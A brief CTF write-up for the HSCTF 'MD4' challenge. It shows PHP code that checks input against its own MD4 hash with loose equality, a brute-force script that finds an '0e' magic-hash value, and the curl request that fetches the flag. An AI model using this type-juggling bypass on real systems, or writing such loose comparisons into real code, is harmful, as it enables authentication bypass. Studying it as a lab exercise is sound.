# HSCTF - MD4 --

## Desc

It's a type juggling vuln

## Code 
```php
<?php
$flag = file_get_contents("/flag");

if (!isset($_GET["md4"]))
{
    highlight_file(__FILE__);
    die();
}

if ($_GET["md4"] == hash("md4", $_GET["md4"]))
{
    echo $flag;
}
else
{
    echo "bad";
}
?>
```

## Sploit
```php
<?php
ini_set('max_execution_time', 300);
for($i=0;$i<999999999;$i++)
    if ("0e".$i == hash("md4", "0e".$i))
        echo "0e".$i."    SUCCESS";
?>
```
```bash
$ php solve.php
0e251288019    SUCCESS

$ curl https://md4.web.chal.hsctf.com/\?md4\=0e251288019
hsctf{php_type_juggling_is_fun}

```
